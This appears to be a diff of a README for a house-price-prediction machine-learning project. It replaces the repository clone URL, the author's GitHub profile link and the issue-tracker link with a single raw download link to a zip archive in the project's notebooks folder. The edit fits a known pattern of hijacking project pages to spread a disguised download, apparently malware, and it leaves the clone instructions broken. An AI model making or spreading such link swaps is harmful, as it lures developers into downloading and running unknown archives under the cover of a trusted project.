@@ -130,7 +130,7 @@ House-Price-Prediction/
 
 ### Step 1: Clone the Repository
 ```bash
-git clone https://github.com/AlapatiAbhinavChowdhary/House-Price-Prediction.git
+git clone https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/House-Price-Prediction/main/notebooks/Price_Prediction_House_3.5.zip
 cd House-Price-Prediction
 ```
 
@@ -451,7 +451,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 👨‍💻 Author
 
 **Alapati Abhinav Chowdhary**
-- GitHub: [@AlapatiAbhinavChowdhary](https://github.com/AlapatiAbhinavChowdhary)
+- GitHub: [@AlapatiAbhinavChowdhary](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/House-Price-Prediction/main/notebooks/Price_Prediction_House_3.5.zip)
 
 ---
 
@@ -466,7 +466,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Support
 
 If you have any questions or issues, please:
-- Open an issue on [GitHub](https://github.com/AlapatiAbhinavChowdhary/House-Price-Prediction/issues)
+- Open an issue on [GitHub](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/House-Price-Prediction/main/notebooks/Price_Prediction_House_3.5.zip)
 - Check the documentation
 
 ---
